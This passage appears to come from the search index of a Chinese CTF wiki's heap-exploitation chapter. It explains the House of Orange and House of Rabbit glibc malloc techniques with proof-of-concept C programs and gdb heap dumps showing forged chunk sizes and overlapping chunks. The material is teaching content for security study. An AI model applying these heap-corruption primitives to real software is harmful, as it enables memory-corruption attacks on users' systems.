chunk\u4f1a\u88ab\u91ca\u653e\u5e76\u88ab\u7f6e\u5165unsorted bin\u4e2d\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5728\u6ca1\u6709free\u51fd\u6570\u60c5\u51b5\u4e0b\u83b7\u53d6\u5230unsorted bins\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u6211\u4eec\u5047\u8bbe\u76ee\u524d\u7684top chunk\u5df2\u7ecf\u4e0d\u6ee1\u8db3malloc\u7684\u5206\u914d\u9700\u6c42\u3002 \u9996\u5148\u6211\u4eec\u5728\u7a0b\u5e8f\u4e2d\u7684 malloc \u8c03\u7528\u4f1a\u6267\u884c\u5230libc.so\u7684 _int_malloc \u51fd\u6570\u4e2d\uff0c\u5728 _int_malloc \u51fd\u6570\u4e2d\uff0c\u4f1a\u4f9d\u6b21\u68c0\u9a8cfastbin\u3001small bins\u3001unsorted bin\u3001large bins\u662f\u5426\u53ef\u4ee5\u6ee1\u8db3\u5206\u914d\u8981\u6c42\uff0c\u56e0\u4e3a\u5c3a\u5bf8\u95ee\u9898\u8fd9\u4e9b\u90fd\u4e0d\u7b26\u5408\u3002\u63a5\u4e0b\u6765 _int_malloc \u51fd\u6570\u4f1a\u8bd5\u56fe\u4f7f\u7528top chunk\uff0c\u5728\u8fd9\u91cctop chunk\u4e5f\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u7684\u8981\u6c42\uff0c\u56e0\u6b64\u4f1a\u6267\u884c\u5982\u4e0b\u5206\u652f\u3002 /* Otherwise, relay to handle system-dependent cases */ else { void *p = sysmalloc(nb, av); if (p != NULL && __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p; } \u6b64\u65f6ptmalloc\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u7533\u8bf7\u5806\u5185\u5b58\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u6267\u884csysmalloc\u6765\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u7a7a\u95f4\u3002 \u4f46\u662f\u5bf9\u4e8e\u5806\u6765\u8bf4\u6709mmap\u548cbrk\u4e24\u79cd\u5206\u914d\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u8ba9\u5806\u4ee5brk\u7684\u5f62\u5f0f\u62d3\u5c55\uff0c\u4e4b\u540e\u539f\u6709\u7684top chunk\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u4e2d\u3002 \u7efc\u4e0a\uff0c\u6211\u4eec\u8981\u5b9e\u73b0brk\u62d3\u5c55top chunk\uff0c\u4f46\u662f\u8981\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9blibc\u4e2d\u7684check\u3002 \u9996\u5148\uff0cmalloc\u7684\u5c3a\u5bf8\u4e0d\u80fd\u5927\u4e8e mmp_.mmap_threshold if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max)) \u5982\u679c\u6240\u9700\u5206\u914d\u7684 chunk \u5927\u5c0f\u5927\u4e8e mmap \u5206\u914d\u9608\u503c\uff0c\u9ed8\u8ba4\u4e3a 128K\uff0c\u5e76\u4e14\u5f53\u524d\u8fdb\u7a0b\u4f7f\u7528 mmap()\u5206\u914d\u7684\u5185\u5b58\u5757\u5c0f\u4e8e\u8bbe\u5b9a\u7684\u6700\u5927\u503c\uff0c\u5c06\u4f7f\u7528 mmap()\u7cfb\u7edf\u8c03\u7528\u76f4\u63a5\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002 \u5728sysmalloc\u51fd\u6570\u4e2d\u5b58\u5728\u5bf9top chunk size\u7684check\uff0c\u5982\u4e0b assert((old_top == initial_top(av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse(old_top) && ((unsigned long)old_end & pagemask) == 0)); \u8fd9\u91cc\u68c0\u67e5\u4e86top chunk\u7684\u5408\u6cd5\u6027\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8c03\u7528\u672c\u51fd\u6570\uff0ctop chunk\u53ef\u80fd\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u53ef\u80fdold_size\u4e3a0\u3002 \u5982\u679ctop chunk\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\uff0c\u90a3\u4e48top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u5927\u4e8e\u7b49\u4e8eMINSIZE\uff0c\u56e0\u4e3atop chunk\u4e2d\u5305\u542b\u4e86 fencepost\uff0c\u6240\u4ee5top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u8981\u5927\u4e8eMINSIZE\u3002\u5176\u6b21Top chunk\u5fc5\u987b\u6807\u8bc6\u524d\u4e00\u4e2achunk\u5904\u4e8einuse\u72b6\u6001\uff0c\u5e76\u4e14top chunk\u7684\u7ed3\u675f\u5730\u5740\u5fc5\u5b9a\u662f\u9875\u5bf9\u9f50\u7684\u3002\u6b64\u5916top chunk\u9664\u53bbfencepost\u7684\u5927\u5c0f\u5fc5\u5b9a\u8981\u5c0f\u4e8e\u6240\u9700chunk\u7684\u5927\u5c0f\uff0c\u5426\u5219\u5728_int_malloc()\u51fd\u6570\u4e2d\u4f1a\u4f7f\u7528top chunk\u5206\u5272\u51fachunk\u3002 \u6211\u4eec\u603b\u7ed3\u4e00\u4e0b\u4f2a\u9020\u7684top chunk size\u7684\u8981\u6c42 1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875 2.size\u8981\u5927\u4e8eMINSIZE(0x10) 3.size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size + MINSIZE(0x10) 4.size\u7684prev inuse\u4f4d\u5fc5\u987b\u4e3a1 \u4e4b\u540e\u539f\u6709\u7684top chunk\u5c31\u4f1a\u6267\u884c _int_free \u4ece\u800c\u987a\u5229\u8fdb\u5165unsorted bin\u4e2d\u3002","title":"\u539f\u7406"},{"location":"pwn/heap/house_of_orange/#_4","text":"\u8fd9\u91cc\u7ed9\u51fa\u4e86\u4e00\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u6a21\u62df\u4e86\u4e00\u4e2a\u6ea2\u51fa\u8986\u76d6\u5230top chunk\u7684size\u57df\u3002\u6211\u4eec\u8bd5\u56fe\u628asize\u6539\u5c0f\u4ece\u800c\u5b9e\u73b0brk\u6269\u5c55\uff0c\u5e76\u628a\u539f\u6709\u7684top chunk\u653e\u5165unsorted bin\u4e2d\u3002 #define fake_size 0x41 int main(void) { void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; // overwrite top chunk size malloc(0x60); malloc(0x60); } \u8fd9\u91cc\u6211\u4eec\u628atop chunk\u7684size\u8986\u76d6\u4e3a0x41\u3002\u4e4b\u540e\u7533\u8bf7\u5927\u4e8e\u8fd9\u4e2a\u5c3a\u5bf8\u7684\u5806\u5757\uff0c\u53730x60\u3002 \u4f46\u662f\u5f53\u6211\u4eec\u6267\u884c\u8fd9\u4e2a\u793a\u4f8b\u65f6\u4f1a\u53d1\u73b0\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\uff0c\u539f\u56e0\u5728\u4e8eassert\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u4ece\u800c\u629b\u51fa\u4e86\u5f02\u5e38\u3002 [#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6) [#1] 0x7ffff7a4402a \u2192 Name: __GI_abort() [#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150 \"(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)\", file=0x7ffff7b9ab85 \"malloc.c\", line=0x95a, function=0x7ffff7b9e998 <__func__.11509> \"sysmalloc\") [#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 <main_arena>)","title":"\u793a\u4f8b"},{"location":"pwn/heap/house_of_orange/#_5","text":"\u6211\u4eec\u56de\u5934\u6765\u770b\u4e00\u4e0bassert\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u5217\u51fa\u7684\u6761\u76ee\u90fd\u88ab\u6ee1\u8db3\u4e86\u9664\u4e86\u7b2c\u4e00\u6761\u3002 1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875 \u4ec0\u4e48\u662f\u5bf9\u9f50\u5230\u5185\u5b58\u9875\u5462\uff1f\u6211\u4eec\u77e5\u9053\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u90fd\u662f\u4ee5\u5185\u5b58\u9875\u4e3a\u5355\u4f4d\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u4e00\u822c\u5185\u5b58\u9875\u7684\u5927\u5c0f\u662f4kb\u3002\u90a3\u4e48\u6211\u4eec\u4f2a\u9020\u7684size\u5c31\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u8fd9\u4e2a\u5c3a\u5bf8\u3002\u5728\u8986\u76d6\u4e4b\u524dtop chunk\u7684size\u5927\u5c0f\u662f20fe1\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u77e50x602020+0x20fe0=0x623000\u662f\u5bf9\u4e8e0x1000\uff084kb\uff09\u5bf9\u9f50\u7684\u3002 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <== top chunk 0x602030: 0x0000000000000000 0x0000000000000000 \u56e0\u6b64\u6211\u4eec\u4f2a\u9020\u7684fake_size\u53ef\u4ee5\u662f0x0fe1\u30010x1fe1\u30010x2fe1\u30010x3fe1\u7b49\u5bf94kb\u5bf9\u9f50\u7684size\u3002\u800c0x40\u4e0d\u6ee1\u8db3\u5bf9\u9f50\uff0c\u56e0\u6b64\u4e0d\u80fd\u5b9e\u73b0\u5229\u7528\u3002 #define fake_size 0x1fe1 int main(void) { void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60); } \u8fdb\u884c\u5206\u914d\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230\u539f\u6765\u7684\u5806\u7ecf\u8fc7\u4e86brk\u6269\u5c55 //\u539f\u6709\u7684\u5806 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] //\u7ecf\u8fc7\u6269\u5c55\u7684\u5806 0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap] \u6211\u4eec\u7684\u7533\u8bf7\u88ab\u5206\u914d\u52300x623010\u7684\u4f4d\u7f6e\uff0c\u540c\u65f6\u539f\u6709\u7684\u5806\u88ab\u7f6e\u5165unsorted bin [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 \u2192 Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE) \u56e0\u4e3aunsorted bin\u4e2d\u5b58\u5728\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u4e0b\u6b21\u7684\u5206\u914d\u4f1a\u5207\u5272\u8fd9\u4e2a\u5757 malloc(0x60); 0x602030 [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE) \u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u5185\u5b58\u662f\u4eceunsorted bin\u4e2d\u5207\u5272\u7684\uff0c\u5185\u5b58\u5e03\u5c40\u5982\u4e0b 0x602030: 0x00007ffff7dd2208 0x00007ffff7dd2208 <== \u672a\u88ab\u6e05\u96f6\u7684unsorted bin\u94fe\u8868 0x602040: 0x0000000000602020 0x0000000000602020 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000001f51 <== \u5207\u5272\u5269\u4e0b\u7684\u65b0unsorted bin 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x0000000000000000 0x0000000000000000 \u5176\u5b9ehouse of orange\u7684\u8981\u70b9\u6b63\u5728\u4e8e\u6b64\uff0c\u4e4b\u540e\u7684\u5229\u7528\u56e0\u4e3a\u6d89\u53ca\u5230_IO_FILE\u7684\u77e5\u8bc6\uff0c\u653e\u5230IO_FILE\u72ec\u7acb\u7ae0\u8282\u5206\u4eab\u3002","title":"\u6b63\u786e\u7684\u793a\u4f8b"},{"location":"pwn/heap/house_of_rabbit/","text":"House of Rabbit \u00b6 \u4ecb\u7ecd \u00b6 House of rabbit\u662f\u4e00\u79cd\u4f2a\u9020\u5806\u5757\u7684\u6280\u672f\uff0c\u65e9\u57282017\u5e74\u5df2\u7ecf\u63d0\u51fa\uff0c\u4f46\u5728\u6700\u8fd1\u4e24\u4e2a\u6708\u624d\u5728CTF\u6bd4\u8d5b\u4e2d\u51fa\u73b0\u3002\u6211\u4eec\u4e00\u822c\u8fd0\u7528\u5728fastbin attack\u4e2d\uff0c\u56e0\u4e3aunsorted bin\u7b49\u5176\u5b83\u7684bin\u6709\u66f4\u597d\u7684\u5229\u7528\u624b\u6bb5\u3002 \u539f\u7406 \u00b6 \u6211\u4eec\u77e5\u9053\uff0cfastbin\u4e2d\u4f1a\u628a\u76f8\u540c\u7684size\u7684\u88ab\u91ca\u653e\u7684\u5806\u5757\u7528\u4e00\u4e2a\u5355\u5411\u94fe\u8868\u7ba1\u7406\uff0c\u5206\u914d\u7684\u65f6\u5019\u4f1a\u68c0\u67e5size\u662f\u5426\u5408\u7406\uff0c\u5982\u679c\u4e0d\u5408\u7406\u7a0b\u5e8f\u5c31\u4f1a\u5f02\u5e38\u9000\u51fa\u3002\u800chouse of rabbit\u5c31\u5229\u7528\u4e86\u5728malloc consolidate\u7684\u65f6\u5019fastbin\u4e2d\u7684\u5806\u5757\u8fdb\u884c\u5408\u5e76\u65f6size\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u5047\u7684\u5806\u5757\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u5229\u7528\u505a\u51c6\u5907\u3002 \u7531\u4e8e\u539f\u4f5c\u8005\u7684 POC \u9700\u8981\u7684\u6761\u4ef6\u8f83\u591a\uff0c\u8fd9\u91cc\u6211\u76f4\u63a5\u4ecb\u7ecd\u8fd9\u4e2a\u653b\u51fb\u7684\u672c\u8d28\u5373\u53ef\u3002 \u524d\u63d0\u6761\u4ef6 : 1. \u53ef\u4ee5\u4fee\u6539fastbin\u7684fd\u6307\u9488\u6216size 2. \u53ef\u4ee5\u89e6\u53d1malloc consolidate(merge top\u6216malloc big chunk\u7b49\u7b49) \u4e0b\u9762\u6765\u770b\u4e00\u4e0bPOC POC 1 : modify the size of fastbin chunk unsigned long * chunk1 = malloc ( 0x40 ); //0x602000 unsigned long * chunk2 = malloc ( 0x40 ); //0x602050 malloc ( 0x10 ); free ( chunk1 ); free ( chunk2 ); /* Heap layout 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0x51 ('Q') 0016| 0x602010 --> 0x0 ..... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x51 ('Q') 0096| 0x602060 --> 0x602000 --> 0x0 0104| 0x602068 --> 0x0 ...... 0160| 0x6020a0 --> 0x0 0168| 0x6020a8 --> 0x21 ('!') 0176| 0x6020b0 --> 0x0 0184| 0x6020b8 --> 0x0 */ chunk1 [ - 1 ] = 0xa1 ; //modify chunk1 size to be 0xa1 malloc ( 0x1000 ); //allocate a large chunk, trigger malloc consolidate /*Chunk1 overlap with chunk2 now gdb-peda$ telescope 0x602000 100 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0xa1 0016| 0x602010 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...) 0024| 0x602018 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...) 0032| 0x602020 --> 0x0 ..... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x51 ('Q') 0096| 0x602060 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...) 0104| 0x602068 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...) 0112| 0x602070 --> 0x0 0120| 0x602078 --> 0x0 .... 0152| 0x602098 --> 0x0 0160| 0x6020a0 --> 0xa0 0168| 0x6020a8 --> 0x20 (' ') gdb-peda$ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x603450 (size : 0x1fbb0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602050 (0x0a0) smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) ) */ POC 2 :modify FD pointer unsigned long * chunk1 = malloc ( 0x40 ); //0x602000 unsigned long * chunk2 = malloc ( 0x100 ); //0x602050 chunk2 [ 1 ] = 0x31 ; //fake chunk size 0x30 chunk2 [ 7 ] = 0x21 //fake chunk's next chunk chunk2 [ 11 ] = 0x21 //fake chunk's next chunk's next chuck /* Heap laylout 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0x51 ('Q') 0016| 0x602010 --> 0x0 ...... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x111 0096| 0x602060 --> 0x0 0104| 0x602068 --> 0x31 ('1') 0112| 0x602070 --> 0x0 ...... 0144| 0x602090 --> 0x0 0152| 0x602098 --> 0x21 ('!') 0160| 0x6020a0 --> 0x0 0168| 0x6020a8 --> 0x0 0176| 0x6020b0 --> 0x0 0184| 0x6020b8 --> 0x21 ('!') 0192| 0x6020c0 --> 0x0 ...... 0352| 0x602160 --> 0x0 0360| 0x602168 --> 0x20ea1 */ free ( chunk1 ); chuck1 [ 0 ] = 0x602060 ; // modify the fd of chunk1 /* gdb-peda$ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0 */ malloc ( 5000 ); // malloc a big chunk to trigger malloc consolidate /* gdb-peda$ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x6034f0 (size : 0x1fb10) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602000 (0x030) smallbin[ 1]: 0x602060 */ \u539f\u7406\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u901a\u8fc7\u4fee\u6539fastbin chunk\u7684size(\u5982\u4e0a\u9762\u7684POC 1\u6240\u793a)\u76f4\u63a5\u6784\u9020overlap chunk\uff0c\u6216\u8005\u4fee\u6539fd(\u5982\u9762\u7684POC 2\u6240\u793a)\uff0c\u8ba9\u5b83\u6307\u5411\u4e00\u4e2afake chunk\uff0c\u89e6\u53d1malloc consolidate\u4e4b\u540e\u8ba9\u8fd9\u4e2afake chunk\u6210\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684chunk\u3002 \u603b\u7ed3 \u00b6 House of rabbit\u7684\u4f18\u70b9\u662f\u5bb9\u6613\u6784\u9020overlap chunk\uff0c\u7531\u4e8e\u53ef\u4ee5\u57fa\u4e8efastbin attack\uff0c\u751a\u81f3\u4e0d\u9700\u8981leak\u5c31\u53ef\u4ee5\u5b8c\u6210\u653b\u51fb\u3002\u5927\u5bb6\u53ef\u4ee5\u901a\u8fc7\u4f8b\u9898\u7684\u7ec3\u4e60\u52a0\u6df1\u5bf9\u8fd9\u4e2a\u653b\u51fb\u7684\u7406\u89e3\u3002 \u4f8b\u9898 \u00b6 HITB-GSEC-XCTF 2018 mutepig \u5f85\u8865\u5145","title":"House of Rabbit"},{"location":"pwn/heap/house_of_rabbit/#house-of-rabbit","text":"","title":"House of Rabbit"},{"location":"pwn/heap/house_of_rabbit/#_1","text":"House of rabbit\u662f\u4e00\u79cd\u4f2a\u9020\u5806\u5757\u7684\u6280\u672f\uff0c\u65e9\u57282017\u5e74\u5df2\u7ecf\u63d0\u51fa\uff0c\u4f46\u5728\u6700\u8fd1\u4e24\u4e2a\u6708\u624d\u5728CTF\u6bd4\u8d5b\u4e2d\u51fa\u73b0\u3002\u6211\u4eec\u4e00\u822c\u8fd0\u7528\u5728fastbin attack\u4e2d\uff0c\u56e0\u4e3aunsorted bin\u7b49\u5176\u5b83\u7684bin\u6709\u66f4\u597d\u7684\u5229\u7528\u624b\u6bb5\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/house_of_rabbit/#_2","text":"\u6211\u4eec\u77e5\u9053\uff0cfastbin\u4e2d\u4f1a\u628a\u76f8\u540c\u7684size\u7684\u88ab\u91ca\u653e\u7684\u5806\u5757\u7528\u4e00\u4e2a\u5355\u5411\u94fe\u8868\u7ba1\u7406\uff0c\u5206\u914d\u7684\u65f6\u5019\u4f1a\u68c0\u67e5size\u662f\u5426\u5408\u7406\uff0c\u5982\u679c\u4e0d\u5408\u7406\u7a0b\u5e8f\u5c31\u4f1a\u5f02\u5e38\u9000\u51fa\u3002\u800chouse of rabbit\u5c31\u5229\u7528\u4e86\u5728malloc consolidate\u7684\u65f6\u5019fastbin\u4e2d\u7684\u5806\u5757\u8fdb\u884c\u5408\u5e76\u65f6size\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u5047\u7684\u5806\u5757\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u5229\u7528\u505a\u51c6\u5907\u3002 \u7531\u4e8e\u539f\u4f5c\u8005\u7684 POC \u9700\u8981\u7684\u6761\u4ef6\u8f83\u591a\uff0c\u8fd9\u91cc\u6211\u76f4\u63a5\u4ecb\u7ecd\u8fd9\u4e2a\u653b\u51fb\u7684\u672c\u8d28\u5373\u53ef\u3002 \u524d\u63d0\u6761\u4ef6 : 1. \u53ef\u4ee5\u4fee\u6539fastbin\u7684fd\u6307\u9488\u6216size 2. \u53ef\u4ee5\u89e6\u53d1malloc consolidate(merge top\u6216malloc big chunk\u7b49\u7b49) \u4e0b\u9762\u6765\u770b\u4e00\u4e0bPOC POC 1 : modify the size of fastbin chunk unsigned long * chunk1 = malloc ( 0x40 ); //0x602000 unsigned long * chunk2 = malloc ( 0x40 ); //0x602050 malloc ( 0x10 ); free ( chunk1 ); free ( chunk2 ); /* Heap layout 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0x51 ('Q') 0016| 0x602010 --> 0x0 ..... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x51 ('Q') 0096| 0x602060 --> 0x602000 --> 0x0 0104| 0x602068 --> 0x0 ...... 0160| 0x6020a0 --> 0x0 0168| 0x6020a8 --> 0x21 ('!') 0176| 0x6020b0 --> 0x0 0184| 0x6020b8 --> 0x0 */ chunk1 [ - 1 ] = 0xa1 ; //modify chunk1 size to be 0xa1 malloc ( 0x1000 ); //allocate a large chunk, trigger malloc consolidate /*Chunk1 overlap with chunk2 now gdb-peda$ telescope 0x602000 100 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0xa1 0016| 0x602010 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...) 0024| 0x602018 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...) 0032| 0x602020 --> 0x0 ..... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x51 ('Q') 0096| 0x602060 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...) 0104| 0x602068 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...) 0112| 0x602070 --> 0x0 0120| 0x602078 --> 0x0 .... 0152| 0x602098 --> 0x0 0160| 0x6020a0 --> 0xa0 0168| 0x6020a8 --> 0x20 (' ') gdb-peda$ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x603450 (size : 0x1fbb0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602050 (0x0a0) smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) ) */ POC 2 :modify FD pointer unsigned long * chunk1 = malloc ( 0x40 ); //0x602000 unsigned long * chunk2 = malloc ( 0x100 ); //0x602050 chunk2 [ 1 ] = 0x31 ; //fake chunk size 0x30 chunk2 [ 7 ] = 0x21 //fake chunk's next chunk chunk2 [ 11 ] = 0x21 //fake chunk's next chunk's next chuck /* Heap laylout 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0x51 ('Q') 0016| 0x602010 --> 0x0 ...... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x111 0096| 0x602060 --> 0x0 0104| 0x602068 --> 0x31 ('1') 0112| 0x602070 --> 0x0 ...... 0144| 0x602090 --> 0x0 0152| 0x602098 --> 0x21 ('!') 0160| 0x6020a0 --> 0x0 0168| 0x6020a8 --> 0x0 0176| 0x6020b0 --> 0x0 0184| 0x6020b8 --> 0x21 ('!') 0192| 0x6020c0 --> 0x0 ...... 0352| 0x602160 --> 0x0 0360| 0x602168 --> 0x20ea1 */ free ( chunk1 ); chuck1 [ 0 ] = 0x602060 ; // modify the fd of chunk1 /* gdb-peda$ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0 */ malloc ( 5000 ); // malloc a big chunk to trigger malloc consolidate /* gdb-peda$ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x6034f0 (size : 0x1fb10) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602000 (0x030) smallbin[ 1]: 0x602060 */ \u539f\u7406\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u901a\u8fc7\u4fee\u6539fastbin chunk\u7684size(\u5982\u4e0a\u9762\u7684POC 1\u6240\u793a)\u76f4\u63a5\u6784\u9020overlap chunk\uff0c\u6216\u8005\u4fee\u6539fd(\u5982\u9762\u7684POC 2\u6240\u793a)\uff0c\u8ba9\u5b83\u6307\u5411\u4e00\u4e2afake chunk\uff0c\u89e6\u53d1malloc consolidate\u4e4b\u540e\u8ba9\u8fd9\u4e2afake chunk\u6210\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684chunk\u3002","title":"\u539f\u7406"},{"location":"pwn/heap/house_of_rabbit/#_3","text":"House of rabbit\u7684\u4f18\u70b9\u662f\u5bb9\u6613\u6784\u9020overlap chunk\uff0c\u7531\u4e8e\u53ef\u4ee5\u57fa\u4e8efastbin attack\uff0c\u751a\u81f3\u4e0d\u9700\u8981leak\u5c31\u53ef\u4ee5\u5b8c\u6210\u653b\u51fb\u3002\u5927\u5bb6\u53ef\u4ee5\u901a\u8fc7\u4f8b\u9898\u7684\u7ec3\u4e60\u52a0\u6df1\u5bf9\u8fd9\u4e2a\u653b\u51fb\u7684\u7406\u89e3\u3002","title":"\u603b\u7ed3"},{"location":"pwn/heap/house_of_rabbit/#_4","text":"HITB-GSEC-XCTF 2018 mutepig \u5f85\u8865\u5145","title":"\u4f8b\u9898"},{"location":"pwn/heap/house_of_roman/","text":"House of Roman \u00b6 \u4ecb\u7ecd \u00b6 House of Roman \u8fd9\u4e2a\u6280\u5de7\u8bf4\u7b80\u5355\u70b9\u5176\u5b9e\u5c31\u662f fastbin attack \u548c Unsortbin attachk \u7ed3\u5408\u7684\u4e00\u4e2a\u5c0f trick\u3002 \u6982\u62ec \u00b6 \u8be5\u6280\u672f\u7528\u4e8e bypass 